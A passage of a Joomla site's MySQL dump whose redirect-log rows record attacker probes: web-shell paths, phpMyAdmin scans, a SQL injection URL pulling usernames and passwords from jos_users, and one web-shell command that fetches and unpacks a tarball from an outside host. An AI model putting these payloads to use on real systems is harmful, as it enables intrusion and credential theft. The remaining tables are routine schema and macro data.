00:00:00'),(502,'http://hackforathens.org/component/content/article/18-challenges/49-athens-affordable-internet-challenge&amp;sa=U&amp;ei=WhHAUvm0L6iw4QTmv4HoBw&amp;ved=0CB0QFjAAOG4&amp;usg=AFQjCNEQe4kX1FlF11YUytsTzSrM5eYL7A/images/stories/vars.php?x','','','',1,0,'2013-12-29 12:16:47','0000-00-00 00:00:00'),(503,'http://hackforathens.org/component/content/article/18-challenges/images/stories/vars.php?x','','','',3,0,'2013-12-29 12:16:47','0000-00-00 00:00:00'),(504,'http://hackforathens.org/images/stories/vars.php?x','','','',3,0,'2013-12-29 12:16:47','0000-00-00 00:00:00'),(505,'http://www.hackforathens.org/ipzssqigl.html','','','',1,0,'2013-12-30 12:17:52','0000-00-00 00:00:00'),(506,'http://hackforathens.org//images/stories/bkht.php?rf','','','',1,0,'2014-01-01 19:14:49','0000-00-00 00:00:00'),(507,'http://hackforathens.org/component/content/article/18-challenges/49-athens-affordable-internet-challenge&amp;sa=U&amp;ei=j97HUtitIamP4gT_nIHAAQ&amp;ved=0CC0QFjADOGQ&amp;usg=AFQjCNFXRzr0TIrK5XUBUs-H2Hv5cVcmMA/images/stories/vars.php?x','','','',1,0,'2014-01-04 10:16:28','0000-00-00 00:00:00'),(508,'http://hackforathens.org/component/content/article/18-challenges/49-athens-affordable-internet-challenge&amp;sa=U&amp;ei=eezHUuuFFYWd7Qbi44C4Aw&amp;ved=0CC0QFjADOGQ&amp;usg=AFQjCNH9Zoqph0owvOtSCm5TPyvOcj5eiQ/images/stories/vars.php?x','','','',1,0,'2014-01-04 11:12:37','0000-00-00 00:00:00'),(509,'http://hackforathens.org/wp-login.phpindex.php','','hackforathens.org/wp-login.phpindex.php','',1,0,'2014-01-05 11:34:44','0000-00-00 00:00:00'),(510,'http://hackforathens.org/component/content/article/18-challenges//images/stories/3xp.php','','','',2,0,'2014-01-05 17:36:06','0000-00-00 00:00:00'),(511,'http://hackforathens.org/cahce/index.html','','','',1,0,'2014-01-05 19:42:19','0000-00-00 00:00:00'),(512,'http://hackforathens.org/modules/mod_araticlhess/mod_araticlhess.php','','','',2,0,'2014-01-06 02:23:51','0000-00-00 00:00:00'),(513,'http://www.hackforathens.org/jnorcyduwn.html','','','',1,0,'2014-01-06 05:26:48','0000-00-00 00:00:00'),(514,'http://hackforathens.org/modules/mod_cmsfix/mod_cmsfix.php','','','',2,0,'2014-01-06 10:41:36','0000-00-00 00:00:00'),(515,'http://hackforathens.org/modules/mod_googleapi/mod_googleapi.php','','','',2,0,'2014-01-07 00:27:59','0000-00-00 00:00:00'),(516,'http://hackforathens.org/modules/mod_backup2/mod_backup2.php','','','',1,0,'2014-01-07 15:32:29','0000-00-00 00:00:00'),(517,'http://hackforathens.org/components/com_rokdownloads/closelog.php','','','',2,0,'2014-01-08 04:14:15','0000-00-00 00:00:00'),(518,'http://hackforathens.org/administrator/components/com_aceftp/quixplorer/index.php','','','',1,0,'2014-01-09 06:34:52','0000-00-00 00:00:00'),(519,'http://hackforathens.org/index.php?option=com_user&view=reset&layout=confirm','','','',1,0,'2014-01-09 14:03:06','0000-00-00 00:00:00'),(520,'http://hackforathens.org/modules/mod_add/mod_add.php','','','',1,0,'2014-01-10 09:59:23','0000-00-00 00:00:00'),(521,'http://hackforathens.org/media/system/images/gallery.php','','','',1,0,'2014-01-11 00:11:32','0000-00-00 00:00:00'),(522,'http://hackforathens.org/modules/mod_joomla_wso/mod_joomla_wso.php','','','',1,0,'2014-01-11 14:08:32','0000-00-00 00:00:00'),(523,'http://hackforathens.org/administrator/xbczmsd.php','','','',1,0,'2014-01-12 01:02:46','0000-00-00 00:00:00'),(524,'http://hackforathens.org/administrator/fix.php','','','',1,0,'2014-01-12 14:50:58','0000-00-00 00:00:00'),(525,'http://hackforathens.org/includes/templates.php','','','',1,0,'2014-01-13 01:45:19','0000-00-00 00:00:00'),(526,'http://www.hackforathens.org/zlvsmbhhrn.html','','','',1,0,'2014-01-13 03:18:19','0000-00-00 00:00:00'),(527,'http://hackforathens.org/modules/mod_media_style/mod_media_style.php','','','',2,0,'2014-01-13 22:35:52','0000-00-00 00:00:00'),(528,'http://hackforathens.org/modules/mod_apis/mod_apis.php','','','',2,0,'2014-01-14 14:16:07','0000-00-00 00:00:00'),(529,'http://hackforathens.org/tmp/k.php','','','',1,0,'2014-01-17 06:30:00','0000-00-00 00:00:00'),(530,'http://hackforathens.org/images/i.php','','','',1,0,'2014-01-18 22:34:02','0000-00-00 00:00:00'),(531,'http://www.hackforathens.org/cgwlvbqrnzde.html','','','',1,0,'2014-01-19 17:50:39','0000-00-00 00:00:00'),(532,'http://hackforathens.org/includes/function.php','','','',1,0,'2014-01-20 22:35:45','0000-00-00 00:00:00'),(533,'http://www.hackforathens.org/component/content/?Itemid=112&id=5','','','',1,0,'2014-01-25 09:50:35','0000-00-00 00:00:00'),(534,'http://www.hackforathens.org/component/content/?Itemid=117&id=10','','','',2,0,'2014-01-27 04:42:45','0000-00-00 00:00:00'),(535,'http://www.hackforathens.org/nfwjcrydvn.html','','','',1,0,'2014-01-27 14:18:13','0000-00-00 00:00:00'),(536,'http://hackforathens.org/images/stories/gif.php','','','',1,0,'2014-01-27 14:59:31','0000-00-00 00:00:00'),(537,'http://hackforathens.org/component/content/article/18-challenges/images/stories/food.php?rf','','','',1,0,'2014-01-27 16:26:36','0000-00-00 00:00:00'),(538,'http://hackforathens.org/images/stories/food.php?rf','','','',12,0,'2014-01-27 16:26:39','0000-00-00 00:00:00'),(539,'http://hackforathens.org/images/banners/banner.php','','','',1,0,'2014-01-27 21:22:43','0000-00-00 00:00:00'),(540,'http://www.hackforathens.org/component/content/?Itemid=113&id=6','','','',2,0,'2014-01-28 10:09:41','0000-00-00 00:00:00'),(541,'http://hackforathens.org/admin123','','','',1,0,'2014-02-03 07:27:35','0000-00-00 00:00:00'),(542,'http://hackforathens.org/phpMyAdmin/scripts/setup.php','','http://hackforathens.org/phpMyAdmin/scripts/setup.php','',1,0,'2014-02-05 12:36:48','0000-00-00 00:00:00'),(543,'http://hackforathens.org/myadmin/scripts/setup.php','','http://hackforathens.org/myadmin/scripts/setup.php','',1,0,'2014-02-05 12:36:48','0000-00-00 00:00:00'),(544,'http://hackforathens.org/pma/scripts/setup.php','','http://hackforathens.org/pma/scripts/setup.php','',1,0,'2014-02-05 12:36:49','0000-00-00 00:00:00'),(545,'http://hackforathens.org/components/com_community/index.html','','','',1,0,'2014-02-06 14:38:16','0000-00-00 00:00:00'),(546,'http://www.hackforathens.org/ouvytyniogmwfgoe.html','','','',1,0,'2014-02-07 09:55:08','0000-00-00 00:00:00'),(547,'http://hackforathens.org/images/post.php','','','',1,0,'2014-02-08 12:17:24','0000-00-00 00:00:00'),(548,'http://hackforathens.org/tmp/xmlrpc.php','','','',1,0,'2014-02-09 02:15:05','0000-00-00 00:00:00'),(549,'http://hackforathens.org/trackback/','','http://hackforathens.org/trackback/','',1,0,'2014-02-15 20:12:43','0000-00-00 00:00:00'),(550,'http://www.hackforathens.org/forum/76-Official-Announcements-and-News-about-Kunena/129490-kunena-3-0-4-released','','http://www.hackforathens.org/forum/76-Official-Announcements-and-News-about-Kunena/129490-kunena-3-0-4-released','',1,0,'2014-02-16 05:02:07','0000-00-00 00:00:00'),(551,'http://www.hackforathens.org/76-Official-Announcements-and-News-about-Kunena/129490-kunena-3-0-4-released','','http://www.hackforathens.org/76-Official-Announcements-and-News-about-Kunena/129490-kunena-3-0-4-released','',1,0,'2014-02-16 05:02:07','0000-00-00 00:00:00'),(552,'http://www.hackforathens.org/czpgxgshl.html','','','',1,0,'2014-02-20 00:36:25','0000-00-00 00:00:00'),(553,'http://hackforathens.org/images/stories/gay.php?rf','','','',1,0,'2014-02-20 06:38:10','0000-00-00 00:00:00'),(554,'http://hackforathens.org/tmp/jm.php','','','',1,0,'2014-02-20 13:38:45','0000-00-00 00:00:00'),(555,'http://hackforathens.org/modules/mod_msn/mod_msn.php','','','',2,0,'2014-02-20 16:37:33','0000-00-00 00:00:00'),(556,'http://hackforathens.org/phpmyadmin','','','',2,0,'2014-02-22 14:44:50','0000-00-00 00:00:00'),(557,'http://www.hackforathens.org/dqmyrfwdrnbaeba.html','','','',1,0,'2014-02-23 16:28:43','0000-00-00 00:00:00'),(558,'http://hackforathens.org/component/content/article/18-challenges/49-athens-affordable-internet-challenge&amp;sa=U&amp;ei=N7ANU96lLfHn7Aal3YHADQ&amp;ved=0CLkBEBYwHDhk&amp;usg=AFQjCNE7edXv_OILzlMVBUaZI5NYr8reeA//images/stories/localhost.php?rf','','','',1,0,'2014-02-26 09:14:31','0000-00-00 00:00:00'),(559,'http://hackforathens.org/myadmin','','','',1,0,'2014-02-28 03:43:16','0000-00-00 00:00:00'),(560,'http://hackforathens.org/pma','','','',1,0,'2014-03-01 08:33:51','0000-00-00 00:00:00'),(561,'http://www.hackforathens.org/mdtrllyh.html','','','',1,0,'2014-03-03 17:46:42','0000-00-00 00:00:00'),(562,'http://hackforathens.org/g.htm','','','',1,0,'2014-03-06 07:30:03','0000-00-00 00:00:00'),(563,'http://www.hackforathens.org/cvzkdlet.html','','','',1,0,'2014-03-09 01:09:50','0000-00-00 00:00:00'),(564,'http://hackforathens.org/get-involved/teams/login','','http://hackforathens.org/get-involved/teams/login','',1,0,'2014-03-12 18:46:04','0000-00-00 00:00:00'),(565,'http://hackforathens.org/components/com_oziogallery2/imagin/scripts_ralcr/filesystem/writeToFile.php','','none','',1,0,'2014-03-13 04:32:16','0000-00-00 00:00:00'),(566,'http://hackforathens.org/images/pst.php','','http://hackforathens.org','',1,0,'2014-03-13 04:32:17','0000-00-00 00:00:00'),(567,'http://hackforathens.org//RS=^ADAxPg8rTAOlVidTbp2GeuwAa2ggzk-','','http://hackforathens.org/','',1,0,'2014-03-14 07:20:19','0000-00-00 00:00:00'),(568,'http://hackforathens.org/images/stories/food.php?smtp','','','',2,0,'2014-03-14 13:11:10','0000-00-00 00:00:00'),(569,'http://hackforathens.org/images/stories/food.php?cmd=lwp-download http://glendalopez.es/archivos/teli.tar.gz;wget http://glendalopez.es/archivos/teli.tar.gz;curl -O http://glendalopez.es/archivos/teli.tar.gz;tar zxvf teli.tar.gz;rm -fr teli.tar.gz;rm -fr ','','','',1,0,'2014-03-14 13:11:11','0000-00-00 00:00:00'),(570,'http://www.hackforathens.org/ktpnuvbrzkxf.html','','','',1,0,'2014-03-16 23:46:09','0000-00-00 00:00:00'),(571,'http://hackforathens.org/SlurpConfirm404.htm','','','',1,0,'2014-03-18 03:03:42','0000-00-00 00:00:00'),(572,'http://hackforathens.org/SlurpConfirm404/ForgottenHistory/LUISMUNOZ/traffic.htm','','','',1,0,'2014-03-18 03:03:42','0000-00-00 00:00:00'),(573,'http://hackforathens.org/SlurpConfirm404/senseenhancers/Mysql/fipfedrwp.htm','','','',1,0,'2014-03-18 04:32:49','0000-00-00 00:00:00'),(574,'http://hackforathens.org/SlurpConfirm404/cam/theater.htm','','','',1,0,'2014-03-18 04:32:49','0000-00-00 00:00:00'),(575,'http://hackforathens.org/SlurpConfirm404/christcore.htm','','','',1,0,'2014-03-18 04:55:46','0000-00-00 00:00:00'),(576,'http://hackforathens.org/SlurpConfirm404/syna.htm','','','',1,0,'2014-03-18 05:32:48','0000-00-00 00:00:00'),(577,'http://hackforathens.org/SlurpConfirm404/spec/linux_Documentation_parport.txt.htm','','','',1,0,'2014-03-18 06:20:56','0000-00-00 00:00:00'),(578,'http://hackforathens.org/SlurpConfirm404/wopnomedp/pitching.htm','','','',1,0,'2014-03-18 06:20:56','0000-00-00 00:00:00'),(579,'http://hackforathens.org/SlurpConfirm404/Hypermail/avalencia/new_files.htm','','','',1,0,'2014-03-18 07:21:03','0000-00-00 00:00:00'),(580,'http://hackforathens.org/SlurpConfirm404/se260599cr.htm','','','',1,0,'2014-03-18 07:21:03','0000-00-00 00:00:00'),(581,'http://hackforathens.org//RS=^ADAeVghQByVmJVi0WkvAEp7zWkUwUk-','','http://hackforathens.org/','',1,0,'2014-03-18 18:12:09','0000-00-00 00:00:00'),(582,'http://hackforathens.org/components/com_ag_google_analytics2/in.php','','','',1,0,'2014-03-20 01:17:45','0000-00-00 00:00:00'),(583,'http://hackforathens.org/modules/mod_art/mod_art.php','','','',1,0,'2014-03-20 04:11:29','0000-00-00 00:00:00'),(584,'http://hackforathens.org/index.php?option=com_user&task=register','','','',1,0,'2014-03-21 03:55:56','0000-00-00 00:00:00'),(585,'http://hackforathens.org/libraries/libraries.php','','','',1,0,'2014-03-21 05:37:54','0000-00-00 00:00:00'),(586,'http://hackforathens.org/modules/mod_articless/mod_articless.php','','','',1,0,'2014-03-22 07:57:33','0000-00-00 00:00:00'),(587,'http://hackforathens.org/administrator/jm.php','','','',2,0,'2014-03-24 05:31:33','0000-00-00 00:00:00'),(588,'http://hackforathens.org/cache/jm.php','','','',1,0,'2014-03-24 05:31:33','0000-00-00 00:00:00'),(589,'http://hackforathens.org/modules/mod_googlemapsapi/mod_googlemapsapi.php','','','',1,0,'2014-03-24 05:51:19','0000-00-00 00:00:00'),(590,'http://www.hackforathens.org/izlknwtdfpi.html','','','',1,0,'2014-03-24 15:59:53','0000-00-00 00:00:00'),(591,'http://hackforathens.org/administrator/config.php','','','',1,0,'2014-03-24 17:42:52','0000-00-00 00:00:00'),(592,'http://www.hackforathens.org/components/com_oziogallery/imagin/scripts_ralcr/filesystem/writeToFile.php','','','',2,0,'2014-03-24 20:26:30','0000-00-00 00:00:00'),(593,'http://hackforathens.org/modules/mod_bing/mod_bing.php','','','',1,0,'2014-03-25 07:10:20','0000-00-00 00:00:00'),(594,'http://hackforathens.org/modules/mod_zetta/zetta.php','','','',1,0,'2014-03-25 07:10:20','0000-00-00 00:00:00'),(595,'http://hackforathens.org/components/com_hello/views/dlll.php','','','',1,0,'2014-03-25 08:41:54','0000-00-00 00:00:00'),(596,'http://hackforathens.org//RS=^ADArtCSpJijyq5yOxxBio8FToCInjI-','','http://hackforathens.org/','',1,0,'2014-03-26 01:15:33','0000-00-00 00:00:00'),(597,'http://hackforathens.org/administrator/modules/mod_custom/view.php','','','',1,0,'2014-03-26 07:11:18','0000-00-00 00:00:00'),(598,'http://hackforathens.org/components/com_jnews/includes/openflashchart/tmp-upload-images/a1.php','','','',1,0,'2014-03-26 07:59:18','0000-00-00 00:00:00'),(599,'http://hackforathens.org/modules/img/mode.php','','','',2,0,'2014-03-26 16:52:53','0000-00-00 00:00:00'),(600,'http://hackforathens.org/tmp/old.php','','','',1,0,'2014-03-27 15:40:41','0000-00-00 00:00:00'),(601,'http://hackforathens.org/component/content/article/18-challenges//images/stories/wawalo.gif','','','',1,0,'2014-03-28 07:21:42','0000-00-00 00:00:00'),(602,'http://www.hackforathens.org/evyvdrqxktqhlak.html','','','',1,0,'2014-03-29 16:34:59','0000-00-00 00:00:00'),(603,'http://hackforathens.org/index.php?option=com_tag&controller=tag&task=add&article_id=-260479/**//*!union*//**//*!select*//**/concat(username,0x3a,password,0x3a,usertype)/**//*!from*//**/jos_users/**/&tmpl=component','','','',1,0,'2014-03-29 19:23:03','0000-00-00 00:00:00'),(604,'http://hackforathens.org/images/stcchatcc.php','','','',1,0,'2014-03-31 03:43:35','0000-00-00 00:00:00'),(605,'http://hackforathens.org/components/com_user/models/log.php','','','',1,0,'2014-03-31 04:07:48','0000-00-00 00:00:00'),(606,'http://hackforathens.org/components/com_hello/views/hello/by.php','','','',1,0,'2014-03-31 04:07:48','0000-00-00 00:00:00'),(607,'http://hackforathens.org/confiq.php','','','',1,0,'2014-03-31 04:15:34','0000-00-00 00:00:00'),(608,'http://hackforathens.org/administrator/ndong.php','','','',1,0,'2014-03-31 04:29:17','0000-00-00 00:00:00'),(609,'http://hackforathens.org/modules/mod_mail/mod_mail.php','','','',1,0,'2014-03-31 05:03:14','0000-00-00 00:00:00'),(610,'http://hackforathens.org/modules/mod_twit/mod_twit.php','','','',1,0,'2014-03-31 07:12:13','0000-00-00 00:00:00'),(611,'http://hackforathens.org/images/babus.php','','','',1,0,'2014-03-31 19:20:36','0000-00-00 00:00:00'),(612,'http://hackforathens.org/images/upgrade.php','','','',1,0,'2014-03-31 19:37:42','0000-00-00 00:00:00'),(613,'http://hackforathens.org/images/webadmin.php','','','',1,0,'2014-03-31 20:02:50','0000-00-00 00:00:00'),(614,'http://hackforathens.org/plugins/user/confa.php','','','',1,0,'2014-04-01 01:19:52','0000-00-00 00:00:00'),(615,'http://hackforathens.org/plugins/system/core/core.php','','','',1,0,'2014-04-01 02:20:14','0000-00-00 00:00:00'),(616,'http://hackforathens.org/components/com_userprofiles/userprofiles.php','','','',1,0,'2014-04-01 06:00:30','0000-00-00 00:00:00'),(617,'http://hackforathens.org/administrator/components/com_akeeba/views/postsetup/ds3uig.php','','','',1,0,'2014-04-01 06:14:53','0000-00-00 00:00:00'),(618,'http://hackforathens.org/plugins/system/captcha/captcha.php','','','',1,0,'2014-04-01 06:24:53','0000-00-00 00:00:00'),(619,'http://hackforathens.org/images/wso.php','','','',1,0,'2014-04-01 06:49:47','0000-00-00 00:00:00'),(620,'http://hackforathens.org/modules/mod_footer/tmpl/media-views-rtl.php','','','',1,0,'2014-04-01 06:52:19','0000-00-00 00:00:00'),(621,'http://hackforathens.org/components/com_banners/models/mod.php','','','',1,0,'2014-04-01 06:52:19','0000-00-00 00:00:00'),(622,'http://hackforathens.org/modules/mod_poll/tmpl/installer.php','','','',1,0,'2014-04-01 07:40:27','0000-00-00 00:00:00'),(623,'http://hackforathens.org/images/function.php','','','',1,0,'2014-04-01 07:40:27','0000-00-00 00:00:00'),(624,'http://hackforathens.org/images/nextstyles.php','','','',1,0,'2014-04-01 10:04:02','0000-00-00 00:00:00'),(625,'http://hackforathens.org/images/inbex.php','','','',1,0,'2014-04-01 10:04:05','0000-00-00 00:00:00'),(626,'http://hackforathens.org/components/com_flexicontent/librairies/phpthumb/s.php','','','',1,0,'2014-04-01 20:07:46','0000-00-00 00:00:00'),(627,'http://hackforathens.org/tmp/fix.php','','','',1,0,'2014-04-01 21:19:07','0000-00-00 00:00:00'),(628,'http://hackforathens.org/components/com_jvideodirect/tools/uploader/php/index.php','','','',1,0,'2014-04-02 04:23:03','0000-00-00 00:00:00'),(629,'http://hackforathens.org/components/com_flexicontent/librairies/phpthumb/a.php','','','',1,0,'2014-04-02 04:48:58','0000-00-00 00:00:00'),(630,'http://hackforathens.org/modules/mod_syndicate/media-views-rtl.php','','','',1,0,'2014-04-02 06:28:51','0000-00-00 00:00:00'),(631,'http://hackforathens.org/modules/mod_related_items/media-views-rtl.php','','','',1,0,'2014-04-02 16:15:23','0000-00-00 00:00:00'),(632,'http://hackforathens.org/images/mazen.php','','','',1,0,'2014-04-02 16:15:24','0000-00-00 00:00:00'),(633,'http://hackforathens.org//RK=0/RS=ee1iK4f65BlUSsQUtzE7YS4Hnu0-','','http://hackforathens.org/','',1,0,'2014-04-02 16:52:01','0000-00-00 00:00:00'),(634,'http://hackforathens.org/plugins/user/confwp.php','','','',1,0,'2014-04-03 04:34:02','0000-00-00 00:00:00'),(635,'http://hackforathens.org/images/bimz.php','','','',1,0,'2014-04-03 07:34:57','0000-00-00 00:00:00'),(636,'http://hackforathens.org/images/ct.php','','','',1,0,'2014-04-03 07:34:57','0000-00-00 00:00:00'),(637,'http://hackforathens.org/includes/onewayout.php','','','',1,0,'2014-04-03 09:35:16','0000-00-00 00:00:00'),(638,'http://hackforathens.org/tmp/locus.php','','','',1,0,'2014-04-03 09:59:50','0000-00-00 00:00:00'),(639,'http://hackforathens.org//RK=0/RS=FPbXN1W5c_DBggc2NRw1jWsg540-','','http://hackforathens.org/','',1,0,'2014-04-03 17:42:14','0000-00-00 00:00:00'),(640,'http://hackforathens.org/components/com_contact/pp1.php','','','',1,0,'2014-04-04 04:58:59','0000-00-00 00:00:00'),(641,'http://hackforathens.org/includes/d.php','','','',1,0,'2014-04-04 05:35:44','0000-00-00 00:00:00'),(642,'http://hackforathens.org/plugins/content/geshi/rtl.php','','','',1,0,'2014-04-04 07:57:10','0000-00-00 00:00:00'),(643,'http://hackforathens.org/administrator/modules/mod_feed/tmpl/help.php','','','',1,0,'2014-04-04 07:57:10','0000-00-00 00:00:00'),(644,'http://hackforathens.org/templates/system/online.php','','','',1,0,'2014-04-04 09:12:40','0000-00-00 00:00:00'),(645,'http://hackforathens.org/tmp/ex.php','','','',1,0,'2014-04-04 09:15:20','0000-00-00 00:00:00'),(646,'http://hackforathens.org/components/com_flexicontent/librairies/index2.php','','','',1,0,'2014-04-04 10:33:21','0000-00-00 00:00:00'),(647,'http://hackforathens.org/components/com_jooomlas/s.php','','','',1,0,'2014-04-05 09:58:44','0000-00-00 00:00:00'),(648,'http://www.hackforathens.org/icdhnrfwvdcyxp.html','','','',2,0,'2014-04-05 10:28:34','0000-00-00 00:00:00'),(649,'http://hackforathens.org/CHANGELOG.php','','','',1,0,'2014-04-05 11:34:45','0000-00-00 00:00:00'),(650,'http://hackforathens.org/plugins/user/php-4.5-help.php','','','',1,0,'2014-04-05 12:22:42','0000-00-00 00:00:00'),(651,'http://hackforathens.org/components/com_alphacontent/assets/phpThumb/q1w2.php','','','',1,0,'2014-04-05 12:22:42','0000-00-00 00:00:00'),(652,'http://hackforathens.org/plugins/editors/xstandard/preview.php','','','',1,0,'2014-04-05 12:22:42','0000-00-00 00:00:00'),(653,'http://hackforathens.org//RK=0/RS=9MFcr6sl3YhCPhtOxzhI4bnAv4Y-','','http://hackforathens.org/','',1,0,'2014-04-05 16:34:37','0000-00-00 00:00:00'),(654,'http://hackforathens.org//mambots/editors/fckeditor/editor/filemanager/browser/default/browser.html','','','',1,0,'2014-04-08 01:04:04','0000-00-00 00:00:00'),(655,'http://hackforathens.org/components/com_pagerankchecker/geopic.php','','','',1,0,'2014-04-08 05:08:54','0000-00-00 00:00:00'),(656,'http://hackforathens.org/modules/mod_imglog/mod_imglog.php','','','',1,0,'2014-04-08 05:37:22','0000-00-00 00:00:00'),(657,'http://hackforathens.org/templates/system/web.php','','','',1,0,'2014-04-08 05:37:22','0000-00-00 00:00:00'),(658,'http://hackforathens.org/administrator/components/com_content/models/fields/modal/includes.php','','','',1,0,'2014-04-08 05:37:23','0000-00-00 00:00:00'),(659,'http://hackforathens.org/plugins/editors-xtd/mosimage.php','','','',1,0,'2014-04-08 06:09:20','0000-00-00 00:00:00'),(660,'http://hackforathens.org/images/gallery.php','','','',1,0,'2014-04-08 06:15:21','0000-00-00 00:00:00'),(661,'http://hackforathens.org/administrator/help/en-GB/css/help.php','','','',1,0,'2014-04-08 06:27:10','0000-00-00 00:00:00'),(662,'http://hackforathens.org/includes/geopic.php','','','',1,0,'2014-04-08 07:46:27','0000-00-00 00:00:00'),(663,'http://hackforathens.org/modules/config/config.php','','','',1,0,'2014-04-08 07:46:28','0000-00-00 00:00:00'),(664,'http://hackforathens.org/plugins/system/logins.php','','','',1,0,'2014-04-09 08:50:43','0000-00-00 00:00:00'),(665,'http://hackforathens.org/components/com_search/views/views.php','','','',1,0,'2014-04-09 09:01:41','0000-00-00 00:00:00'),(666,'http://hackforathens.org/modules/mod_banners/tmpl/tmpl.php','','','',1,0,'2014-04-09 09:13:37','0000-00-00 00:00:00'),(667,'http://HACKFORATHENS.ORG/javascript:void(0);','','','',1,0,'2014-04-09 10:43:03','0000-00-00 00:00:00'),(668,'http://hackforathens.org/wp-content/plugins/likebtn-like-button/likebtn_like_button.php','','http://hackforathens.org/wp-content/plugins/likebtn-like-button/likebtn_like_button.php','',1,0,'2014-04-10 00:21:30','0000-00-00 00:00:00'),(669,'http://hackforathens.org/administrator/help/self.php','','','',1,0,'2014-04-10 03:38:45','0000-00-00 00:00:00'),(670,'http://hackforathens.org/modules/mod_system/dp.php','','','',1,0,'2014-04-10 04:56:44','0000-00-00 00:00:00'),(671,'http://hackforathens.org/images/saved.php','','','',1,0,'2014-04-10 04:56:45','0000-00-00 00:00:00'),(672,'http://hackforathens.org/images/pixel.php','','','',1,0,'2014-04-10 07:07:52','0000-00-00 00:00:00'),(673,'http://hackforathens.org/modules/mod_joomcashe/joomcashe.php','','','',1,0,'2014-04-10 07:07:55','0000-00-00 00:00:00'),(674,'http://www.hackforathens.org/yyucvkonoqwg.html','','','',1,0,'2014-04-12 18:03:02','0000-00-00 00:00:00'),(675,'http://hackforathens.org/plugins/content/index.php','','','',1,0,'2014-04-13 03:24:11','0000-00-00 00:00:00'),(676,'http://hackforathens.org/modules/mod_wp/mod_wp.php','','','',1,0,'2014-04-13 03:52:46','0000-00-00 00:00:00'),(677,'http://hackforathens.org/plugins/system/xml.php','','','',1,0,'2014-04-13 04:35:05','0000-00-00 00:00:00'),(678,'http://hackforathens.org/modules/mod_poll/file.php','','','',1,0,'2014-04-13 04:43:08','0000-00-00 00:00:00'),(679,'http://hackforathens.org/modules/pge.php','','','',1,0,'2014-04-13 05:23:12','0000-00-00 00:00:00'),(680,'http://hoa/sponsor','','http://hoa/about/schedule','',1,0,'2014-04-14 18:11:27','0000-00-00 00:00:00'),(681,'http://hoa/?Itemid=173','','http://hoa/contact','',1,0,'2014-04-14 18:35:07','0000-00-00 00:00:00'),(682,'http://hoa/about/schedule','','http://hoa/','',1,0,'2014-04-16 20:43:39','0000-00-00 00:00:00');
/*!40000 ALTER TABLE `hfa_redirect_links` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokadminaudit`
--

DROP TABLE IF EXISTS `hfa_rokadminaudit`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokadminaudit` (
  `id` bigint(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `ip` varchar(50) DEFAULT NULL,
  `session_id` varchar(50) DEFAULT NULL,
  `option` varchar(100) DEFAULT NULL,
  `task` varchar(100) DEFAULT NULL,
  `cid` int(50) DEFAULT NULL,
  `page` varchar(255) DEFAULT NULL,
  `referrer` varchar(255) DEFAULT NULL,
  `title` text,
  `timestamp` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`),
  KEY `ip` (`ip`),
  KEY `session_id` (`session_id`),
  KEY `timestamp` (`timestamp`)
) ENGINE=MyISAM AUTO_INCREMENT=4415 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokadminaudit`
--

LOCK TABLES `hfa_rokadminaudit` WRITE;
/*!40000 ALTER TABLE `hfa_rokadminaudit` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_rokadminaudit` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokcandy`
--

DROP TABLE IF EXISTS `hfa_rokcandy`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokcandy` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `catid` int(11) NOT NULL,
  `macro` text NOT NULL,
  `html` text NOT NULL,
  `published` tinyint(1) NOT NULL,
  `checked_out` int(11) NOT NULL,
  `checked_out_time` datetime NOT NULL,
  `ordering` int(11) NOT NULL,
  `params` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=29 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokcandy`
--

LOCK TABLES `hfa_rokcandy` WRITE;
/*!40000 ALTER TABLE `hfa_rokcandy` DISABLE KEYS */;
INSERT INTO `hfa_rokcandy` VALUES (20,8,'[h1]{text}[/h1]','<h1>{text}</h1>',1,0,'0000-00-00 00:00:00',1,''),(21,8,'[h2]{text}[/h2]','<h2>{text}</h2>',1,0,'0000-00-00 00:00:00',2,''),(22,8,'[h3]{text}[/h3]','<h3>{text}</h3>',1,0,'0000-00-00 00:00:00',3,''),(23,8,'[h4]{text}[/h4]','<h4>{text}</h4>',1,0,'0000-00-00 00:00:00',4,''),(24,8,'[h5]{text}[/h5]','<h5>{text}</h5>',1,0,'0000-00-00 00:00:00',5,''),(25,8,'[b]{text}[/b]','<strong>{text}</strong>',1,0,'0000-00-00 00:00:00',6,''),(26,8,'[i]{text}[/i]','<em>{text}</em>',1,0,'0000-00-00 00:00:00',7,''),(27,8,'[code]{text}[/code]','<code>{text}</code>',1,0,'0000-00-00 00:00:00',8,''),(28,8,'[span class=\"{class}\"]{text}[/span]','<span class=\"{class}\">{text}</span> ',1,0,'0000-00-00 00:00:00',9,'');
/*!40000 ALTER TABLE `hfa_rokcandy` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokcommon_configs`
--

DROP TABLE IF EXISTS `hfa_rokcommon_configs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokcommon_configs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `extension` varchar(45) NOT NULL DEFAULT '',
  `type` varchar(45) NOT NULL,
  `file` varchar(256) NOT NULL,
  `priority` int(10) NOT NULL DEFAULT '10',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=17 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokcommon_configs`
--

LOCK TABLES `hfa_rokcommon_configs` WRITE;
/*!40000 ALTER TABLE `hfa_rokcommon_configs` DISABLE KEYS */;
